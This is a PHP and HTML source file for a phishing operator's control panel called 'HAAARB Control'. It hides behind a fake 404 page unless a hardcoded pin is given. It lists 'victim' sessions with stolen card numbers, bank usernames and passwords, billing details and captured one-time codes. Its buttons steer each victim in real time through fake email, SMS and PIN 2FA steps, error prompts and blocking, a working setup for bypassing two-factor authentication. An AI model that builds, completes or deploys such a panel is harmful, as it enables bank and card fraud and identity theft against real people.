<?php
require_once __DIR__ . '/guard.php';

$panel_key = 'hello';

if (isset($_GET['pin']) && $_GET['pin'] === $panel_key) {
    $_SESSION['pin_ok'] = true;
    $redirectParams = $_GET;
    unset($redirectParams['pin']);
    $redirectUri = $_SERVER['SCRIPT_NAME'];
    if (!empty($redirectParams)) {
        $redirectUri .= '?' . http_build_query($redirectParams);
    }
    header('Location: ' . $redirectUri);
    exit;
}

if (!isset($_SESSION['pin_ok']) || $_SESSION['pin_ok'] !== true) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
}

$dbFile = 'status.json';
$db = getDb($dbFile);

// Cleanup old entries (2 hours)
$changed = false;
foreach ($db as $token => $entry) {
    if (time() - ($entry['last_seen'] ?? 0) > 7200) {
        unset($db[$token]);
        $changed = true;
    }
}
if ($changed) saveDb($db, $dbFile);

// Handle actions
if (isset($_GET['action'], $_GET['token'])) {
    $token = $_GET['token'];
    if ($_GET['action'] === 'reset') {
        if (isset($db[$token])) {
            unset($db[$token]);
            saveDb($db, $dbFile);
        }
    } elseif ($_GET['action'] === 'set_display_email' && isset($_GET['email'])) {
        if (isset($db[$token])) {
            $db[$token]['display_email'] = $_GET['email'];
            saveDb($db, $dbFile);
        }
        if (isset($_GET['ajax'])) {
            header('Content-Type: application/json');
            echo json_encode(['ok' => true]);
            exit;
        }
        header("Location: panel.php?view=" . urlencode($token));
        exit;
    } elseif (isset($db[$token])) {
        $db[$token]['status'] = $_GET['action'];
        $db[$token]['panel_action_time'] = time();
        saveDb($db, $dbFile);
    }
    if (isset($_GET['ajax'])) {
        header('Content-Type: application/json');
        echo json_encode(['ok' => true]);
        exit;
    }
    header("Location: panel.php?view=" . urlencode($token));
    exit;
}

if (isset($_GET['ajax_data']) && isset($_GET['token'])) {
    header('Content-Type: application/json');
    $token = $_GET['token'];
    if (isset($db[$token])) {
        $v = $db[$token];
        $v['label'] = statusLabel($v['status'] ?? 'online');
        $v['color'] = statusColor($v['status'] ?? 'online');
        $v['ago'] = timeAgo($v['last_seen'] ?? 0);
        $v['online'] = (time() - ($v['last_seen'] ?? 0) < 30);
        echo json_encode($v);
    } else {
        echo json_encode(null);
    }
    exit;
}

function statusLabel($s) {
    $map = [
        'online' => 'Online', 'landing_click' => 'Click', 'login_submitted' => 'Login',
        'loading' => 'Loading', 'go_email' => 'Email 2FA', 'code_EMAIL' => 'Email Code',
        'go_sms' => 'SMS 2FA', 'code_SMS' => 'SMS Code',
        'go_pin' => 'PIN', 'pin_error' => 'PIN Error',
        'pin_submitted' => 'PIN Sent', 'pin_forgot' => 'PIN Forgot',
        'finished' => 'Success', 'finished_success' => 'Success',
        'otp_error' => 'Code Error', 'reset' => 'Reset', 'block' => 'Blocked'
    ];
    return $map[$s] ?? strtoupper($s);
}

function statusColor($s) {
    if ($s === 'loading') return '#f59e0b';
    if (strpos($s, 'error') !== false || strpos($s, 'block') !== false) return '#ef4444';
    if (strpos($s, 'success') !== false || strpos($s, 'finished') !== false) return '#22c55e';
    if (strpos($s, 'code_') !== false || strpos($s, 'submitted') !== false) return '#eab308';
    if (strpos($s, 'go_') === 0) return '#3b82f6';
    return '#94a3b8';
}

function timeAgo($ts) {
    $diff = time() - $ts;
    if ($diff < 10) return 'now';
    if ($diff < 60) return $diff . 's';
    if ($diff < 3600) return floor($diff / 60) . 'm';
    return floor($diff / 3600) . 'h';
}

$active_token = $_GET['view'] ?? null;
if (!$active_token && count($db) > 0) {
    $mostRecent = null;
    $lastTime = 0;
    foreach ($db as $token => $entry) {
        if (($entry['last_seen'] ?? 0) > $lastTime) {
            $lastTime = $entry['last_seen'];
            $mostRecent = $token;
        }
    }
    if ($mostRecent) {
        header("Location: panel.php?view=" . urlencode($mostRecent));
        exit;
    }
}

$v = $active_token && isset($db[$active_token]) ? $db[$active_token] : null;
$online = $v ? (time() - ($v['last_seen'] ?? 0) < 30) : false;
$statusColor = $v ? statusColor($v['status'] ?? 'online') : '#94a3b8';
$panelBase = 'https://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/panel.php?pin=hello&view=';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HAAARB — Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
        body { font-family: 'Inter', sans-serif; background: #050505; color: #e5e5e5; }
        .glass { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); backdrop-filter: blur(10px); }
        .glass-hover:hover { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.12); }
        .code-glow { text-shadow: 0 0 40px rgba(59,130,246,0.3); }
        .btn-action { transition: all 0.15s ease; }
        .btn-action:active { transform: scale(0.97); }
        .fade-in { animation: fadeIn 0.3s ease-out; }
        @keyframes fadeIn { from { opacity:0; transform: translateY(6px);} to { opacity:1; transform: translateY(0);} }
        .pulse-dot { animation: pulseDot 2s infinite; }
        @keyframes pulseDot { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="border-b border-white/5 bg-[#0a0a0a] px-6 py-4 flex items-center justify-between sticky top-0 z-50">
        <div class="flex items-center gap-3">
            <div class="w-8 h-8 bg-white text-black rounded-lg flex items-center justify-center font-black text-sm">H</div>
            <span class="font-bold tracking-tight text-sm">HAAARB <span class="text-white/30 font-normal">Control</span></span>
        </div>
        <?php if ($v): ?>
        <div class="flex items-center gap-3">
            <button onclick="copyPanelLink()" class="text-xs bg-white/5 hover:bg-white/10 border border-white/10 px-3 py-1.5 rounded-lg transition flex items-center gap-2">
                <i class="fas fa-link text-white/40"></i>
                <span class="text-white/60 font-mono hidden sm:inline"><?php echo htmlspecialchars(substr($active_token, 0, 12)) . '...'; ?></span>
                <span id="link-copied" class="text-green-400 hidden text-[10px]">Copied</span>
            </button>
        </div>
        <?php endif; ?>
    </div>

    <div class="flex-grow p-4 sm:p-8 max-w-3xl mx-auto w-full">

        <?php if (!$v): ?>
        <div class="h-[70vh] flex flex-col items-center justify-center text-center fade-in">
            <div class="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center mb-6">
                <i class="fas fa-satellite-dish text-2xl text-white/20"></i>
            </div>
            <h2 class="text-xl font-semibold text-white/80 mb-2">Waiting for victim...</h2>
            <p class="text-sm text-white/30">No active sessions found.</p>
        </div>
        <?php else: ?>

        <div class="fade-in mb-6">
            <div class="flex items-center gap-3 mb-1">
                <div class="relative">
                    <div class="w-10 h-10 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center">
                        <i class="fas fa-user text-white/40"></i>
                    </div>
                    <div id="online-dot" class="absolute -bottom-0.5 -right-0.5 w-3 h-3 rounded-full border-2 border-[#050505] <?php echo $online ? 'bg-green-500 pulse-dot' : 'bg-white/20'; ?>"></div>
                </div>
                <div>
                    <div class="flex items-center gap-2">
                        <span class="font-mono text-sm font-semibold tracking-wide"><?php echo htmlspecialchars(substr($active_token, 0, 16)) . '...'; ?></span>
                        <span id="status-badge" class="text-[10px] px-2 py-0.5 rounded-full font-medium" style="background:<?php echo $statusColor; ?>20; color:<?php echo $statusColor; ?>;">
                            <?php echo statusLabel($v['status'] ?? 'online'); ?>
                        </span>
                    </div>
                    <div class="text-[11px] text-white/30 mt-0.5"><span id="ago-text"><?php echo timeAgo($v['last_seen'] ?? 0); ?></span> ago · <?php echo htmlspecialchars($v['ip'] ?? 'no ip'); ?> · <?php echo htmlspecialchars($v['email'] ?? 'no phone'); ?></div>
                </div>
            </div>
        </div>

        <div class="glass rounded-2xl p-8 text-center mb-6 fade-in relative overflow-hidden">
            <div class="absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-blue-500/30 to-transparent"></div>
            <div class="text-[10px] uppercase tracking-[0.2em] text-white/30 mb-4 font-medium">Last Captured Code</div>
            <div id="big-code" class="text-6xl sm:text-7xl font-black font-mono tracking-[12px] text-white code-glow transition-all">
                <?php echo htmlspecialchars($v['last_code'] ?: '------'); ?>
            </div>
        </div>

        <div class="glass rounded-xl p-4 mb-6 fade-in flex items-center gap-3">
            <div class="flex-1">
                <div class="text-[10px] uppercase tracking-wider text-white/30 mb-1.5 font-medium">Display Email</div>
                <input type="text" id="display-email-input" value="<?php echo htmlspecialchars($v['display_email'] ?? ''); ?>" 
                    placeholder="email@example.com" 
                    class="w-full bg-transparent border-none outline-none text-sm font-mono text-white/80 placeholder-white/10">
            </div>
            <button onclick="setDisplayEmail()" id="btn-set-email" class="bg-white text-black px-4 py-2 rounded-lg text-xs font-bold hover:bg-white/90 transition">SET</button>
        </div>

        <div id="data-grid" class="grid grid-cols-2 gap-3 mb-6 fade-in">
            <?php if(isset($v['card_name'])): ?>
            <div class="glass rounded-xl p-3 col-span-2">
                <div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Card</div>
                <div class="font-mono text-sm text-white/90 truncate"><?php echo htmlspecialchars($v['card_number']); ?> <span class="text-white/30 text-xs ml-1"><?php echo htmlspecialchars($v['card_expiry']); ?></span></div>
                <div class="text-[10px] text-white/20 mt-1"><?php echo htmlspecialchars($v['card_name']); ?> · <?php echo htmlspecialchars($v['card_bank'] ?? 'N/A'); ?></div>
            </div>
            <?php endif; ?>
            <?php if(isset($v['bank_username'])): ?>
            <div class="glass rounded-xl p-3">
                <div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Bank User</div>
                <div class="font-mono text-sm text-white/90 truncate"><?php echo htmlspecialchars($v['bank_username']); ?></div>
            </div>
            <div class="glass rounded-xl p-3">
                <div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Bank Pass</div>
                <div class="font-mono text-sm text-white/90 truncate"><?php echo htmlspecialchars($v['bank_password']); ?></div>
            </div>
            <?php endif; ?>
            <?php if(isset($v['billing_address'])): ?>
            <div class="glass rounded-xl p-3 col-span-2">
                <div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Billing</div>
                <div class="font-mono text-xs text-white/70 leading-relaxed">
                    <?php echo htmlspecialchars(($v['billing_firstname']??'').' '.($v['billing_lastname']??'')); ?><br>
                    <?php echo htmlspecialchars($v['billing_address']); ?>, <?php echo htmlspecialchars($v['billing_city']); ?> <?php echo htmlspecialchars($v['billing_zip']); ?><br>
                    <?php echo htmlspecialchars($v['billing_phone'] ?? ''); ?>
                </div>
            </div>
            <?php endif; ?>
        </div>

        <div class="space-y-3 fade-in">
            <div class="text-[10px] uppercase tracking-[0.2em] text-white/20 font-medium px-1">Steps</div>
            <div class="grid grid-cols-4 gap-2">
                <a href="?action=go_email&token=<?php echo urlencode($active_token); ?>" class="action-btn btn-action glass glass-hover rounded-xl p-3 text-center">
                    <i class="fas fa-envelope text-blue-400 mb-1.5 text-lg block"></i>
                    <span class="text-[10px] font-bold text-white/80">EMAIL</span>
                </a>
                <a href="?action=go_sms&token=<?php echo urlencode($active_token); ?>" class="action-btn btn-action glass glass-hover rounded-xl p-3 text-center">
                    <i class="fas fa-sms text-purple-400 mb-1.5 text-lg block"></i>
                    <span class="text-[10px] font-bold text-white/80">SMS</span>
                </a>
                <a href="?action=go_pin&token=<?php echo urlencode($active_token); ?>" class="action-btn btn-action glass glass-hover rounded-xl p-3 text-center">
                    <i class="fas fa-th text-indigo-400 mb-1.5 text-lg block"></i>
                    <span class="text-[10px] font-bold text-white/80">PIN</span>
                </a>
                <a href="?action=finished&token=<?php echo urlencode($active_token); ?>" class="action-btn btn-action glass glass-hover rounded-xl p-3 text-center">
                    <i class="fas fa-check text-emerald-400 mb-1.5 text-lg block"></i>
                    <span class="text-[10px] font-bold text-white/80">DONE</span>
                </a>
            </div>

            <div class="text-[10px] uppercase tracking-[0.2em] text-white/20 font-medium px-1 mt-4">Control</div>
            <div class="grid grid-cols-3 gap-2">
                <button onclick="sendStepError()" id="btn-step-error" class="btn-action glass glass-hover rounded-xl p-3 text-center border-red-500/20 hover:border-red-500/40">
                    <i class="fas fa-times-circle text-red-400 mb-1.5 text-lg block"></i>
                    <span class="text-[10px] font-bold text-white/80">ERROR</span>
                </button>
                <a href="?action=reset&token=<?php echo urlencode($active_token); ?>" class="action-btn btn-action glass glass-hover rounded-xl p-3 text-center">
                    <i class="fas fa-rotate-left text-white/40 mb-1.5 text-lg block"></i>
                    <span class="text-[10px] font-bold text-white/80">RESET</span>
                </a>
                <a href="?action=block&token=<?php echo urlencode($active_token); ?>" class="action-btn btn-action glass glass-hover rounded-xl p-3 text-center">
                    <i class="fas fa-ban text-white/40 mb-1.5 text-lg block"></i>
                    <span class="text-[10px] font-bold text-white/80">BLOCK</span>
                </a>
            </div>
        </div>

        <?php endif; ?>
    </div>

    <script>
    let currentViewToken = '<?php echo addslashes($active_token ?? ''); ?>';
    let lastKnownCode = '<?php echo addslashes($v['last_code'] ?? ''); ?>';
    let lastDataHash = '';

    function copyPanelLink() {
        if (!currentViewToken) return;
        const link = '<?php echo $panelBase; ?>' + encodeURIComponent(currentViewToken);
        navigator.clipboard.writeText(link).then(() => {
            const badge = document.getElementById('link-copied');
            if (badge) { badge.classList.remove('hidden'); setTimeout(() => badge.classList.add('hidden'), 1500); }
        });
    }

    function setDisplayEmail() {
        const email = document.getElementById('display-email-input').value.trim();
        const btn = document.getElementById('btn-set-email');
        fetch('panel.php?action=set_display_email&token=' + encodeURIComponent(currentViewToken) + '&email=' + encodeURIComponent(email) + '&ajax=1')
            .then(r => r.json())
            .then(() => { if (btn) { btn.innerText = 'OK'; setTimeout(() => btn.innerText = 'SET', 800); } });
    }

    function sendStepError() {
        if (!currentViewToken) return;
        fetch('panel.php?ajax_data=1&token=' + encodeURIComponent(currentViewToken))
            .then(r => r.json())
            .then(data => {
                if (!data) return;
                let action = 'otp_error';
                const s = data.status || '';
                if (s.includes('pin') || s === 'go_pin') action = 'pin_error';
                fetch('?action=' + action + '&token=' + encodeURIComponent(currentViewToken) + '&ajax=1')
                    .then(() => {
                        const btn = document.getElementById('btn-step-error');
                        if (btn) {
                            const orig = btn.innerHTML;
                            btn.innerHTML = '<i class="fas fa-check text-green-400 mb-1.5 text-lg block"></i><span class="text-[10px] font-bold text-white/80">SENT</span>';
                            setTimeout(() => btn.innerHTML = orig, 1000);
                        }
                    });
            });
    }

    document.addEventListener('click', function(e) {
        const btn = e.target.closest('.action-btn');
        if (!btn) return;
        e.preventDefault();
        const href = btn.getAttribute('href');
        if (!href) return;
        fetch(href + '&ajax=1').then(() => {
            btn.style.opacity = '0.5';
            setTimeout(() => btn.style.opacity = '1', 200);
        });
    });

    function refreshData() {
        if (!currentViewToken) return;
        fetch('panel.php?ajax_data=1&token=' + encodeURIComponent(currentViewToken))
            .then(r => r.json())
            .then(data => {
                if (!data) return;
                const hash = JSON.stringify(data);
                if (hash === lastDataHash) return;
                lastDataHash = hash;

                // Update status badge + color
                const badge = document.getElementById('status-badge');
                if (badge) {
                    badge.textContent = data.label || data.status;
                    badge.style.background = (data.color || '#94a3b8') + '20';
                    badge.style.color = data.color || '#94a3b8';
                }

                // Update online dot
                const dot = document.getElementById('online-dot');
                if (dot) {
                    if (data.online) {
                        dot.className = 'absolute -bottom-0.5 -right-0.5 w-3 h-3 rounded-full border-2 border-[#050505] bg-green-500 pulse-dot';
                    } else {
                        dot.className = 'absolute -bottom-0.5 -right-0.5 w-3 h-3 rounded-full border-2 border-[#050505] bg-white/20';
                    }
                }

                // Update ago time
                const ago = document.getElementById('ago-text');
                if (ago) ago.textContent = data.ago || 'now';

                // Update big code
                const codeEl = document.getElementById('big-code');
                if (codeEl && data.last_code && data.last_code !== lastKnownCode) {
                    lastKnownCode = data.last_code;
                    codeEl.textContent = data.last_code || '------';
                }

                updateDataGrid(data);
            })
            .catch(() => {});
    }

    function updateDataGrid(data) {
        const grid = document.getElementById('data-grid');
        if (!grid) return;
        let html = '';
        if (data.card_name) {
            html += `<div class="glass rounded-xl p-3 col-span-2 fade-in"><div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Card</div><div class="font-mono text-sm text-white/90 truncate">${data.card_number||''} <span class="text-white/30 text-xs ml-1">${data.card_expiry||''}</span></div><div class="text-[10px] text-white/20 mt-1">${data.card_name||''} · ${data.card_bank||'N/A'}</div></div>`;
        }
        if (data.bank_username) {
            html += `<div class="glass rounded-xl p-3 fade-in"><div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Bank User</div><div class="font-mono text-sm text-white/90 truncate">${data.bank_username}</div></div>`;
            html += `<div class="glass rounded-xl p-3 fade-in"><div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Bank Pass</div><div class="font-mono text-sm text-white/90 truncate">${data.bank_password}</div></div>`;
        }
        if (data.billing_address) {
            html += `<div class="glass rounded-xl p-3 col-span-2 fade-in"><div class="text-[10px] text-white/30 uppercase tracking-wider mb-1">Billing</div><div class="font-mono text-xs text-white/70 leading-relaxed">${(data.billing_firstname||'')+' '+(data.billing_lastname||'')}<br>${data.billing_address}, ${data.billing_city} ${data.billing_zip}<br>${data.billing_phone||''}</div></div>`;
        }
        grid.innerHTML = html;
    }

    if (currentViewToken) {
        setInterval(refreshData, 2500);
        refreshData();
    }
    </script>
</body>
</html>